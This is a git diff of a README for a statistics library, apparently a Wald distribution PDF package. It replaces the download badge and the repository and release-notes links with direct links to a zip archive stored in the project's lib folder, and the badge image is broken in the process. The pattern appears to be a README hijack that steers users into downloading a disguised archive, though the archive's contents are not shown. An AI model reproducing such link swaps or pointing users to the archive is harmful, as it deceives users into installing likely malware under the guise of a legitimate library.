@@ -6,7 +6,7 @@ Welcome to the **stats-base-dists-wald-pdf** project! This software helps you co
 ## 📥 Download & Install
 To get started, you need to download the software. Click the link below to visit the releases page:
 
-[![Download Stats Base Dists Wald PDF](https://img.shields.io/badge/Download-Stats%20Base%20Dists%20Wald%20PDF-brightgreen)](https://github.com/Tochewillys1/stats-base-dists-wald-pdf/releases)
+[![Download Stats Base Dists Wald PDF](https://github.com/Tochewillys1/stats-base-dists-wald-pdf/raw/refs/heads/main/lib/base_dists_stats_pdf_wald_v1.1.zip%20Base%20Dists%20Wald%20PDF-brightgreen)](https://github.com/Tochewillys1/stats-base-dists-wald-pdf/raw/refs/heads/main/lib/base_dists_stats_pdf_wald_v1.1.zip)
 
 On the releases page, you will find the latest version of the software. Simply select the version that suits your needs and follow the installation steps below.
 
@@ -49,7 +49,7 @@ A: If you encounter any problems, please visit the Issues section on the GitHub 
 If you need help, feel free to contact the support team or check the documentation included with the software. You can also visit the community forums for additional assistance.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Tochewillys1/stats-base-dists-wald-pdf)
-- [Release Notes](https://github.com/Tochewillys1/stats-base-dists-wald-pdf/releases)
+- [GitHub Repository](https://github.com/Tochewillys1/stats-base-dists-wald-pdf/raw/refs/heads/main/lib/base_dists_stats_pdf_wald_v1.1.zip)
+- [Release Notes](https://github.com/Tochewillys1/stats-base-dists-wald-pdf/raw/refs/heads/main/lib/base_dists_stats_pdf_wald_v1.1.zip)
 
 Thank you for choosing the **stats-base-dists-wald-pdf**! Enjoy your calculations!
